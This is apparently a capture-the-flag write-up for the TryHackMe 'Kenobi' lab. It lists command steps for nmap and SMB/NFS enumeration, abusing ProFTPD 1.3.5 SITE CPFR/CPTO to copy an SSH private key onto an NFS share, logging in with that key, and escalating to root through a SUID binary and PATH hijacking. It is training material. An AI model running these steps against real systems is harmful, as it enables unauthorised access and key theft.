# Writeup for [Kenobi](https://tryhackme.com/room/kenobi)

```
set -gx IP 10.10.136.23
```


## Task 1: Deploy the vulnerable machine

* run default nmap `sudo nmap -sV -sN -oN nmap/initial $IP`
* run nmap with vuln script `sudo nmap -sV --script vuln -oN nmap/vuln $IP`


## Task 2: Enumerating Samba for shares

* run nmap with smb enumeration scripts `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmap/smb-scripts $IP`
* run nmap with nfs scripts `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP`


## Task 3: Gain initial access with ProFtpd

* use searchsploit to find exploits `searchsploit proftpd 1.3.5`
* copy shh-key from admin to /var/tmp with FTP keywords (SITE CPFR, SITE CPTO)
* mount drive locally `mount $IP:/var /mnt/kenobiNFS`
* copy ssh key and change permission `sudo chmod 600 id_rsa`
* ssh with key file `ssh -i id_rsa kenobi@$IP`


## Task 4: Privilege Escalation with Path Variable Manipulation

* find SUID binaries `find / -perm -u=s -type f 2>/dev/null`
* add `/tmp` folder to PATH
* run `echo /bin/sh > menu`
* change permissions `chmod 777 menu`
* run `/usr/bin/menu` and choose option 3

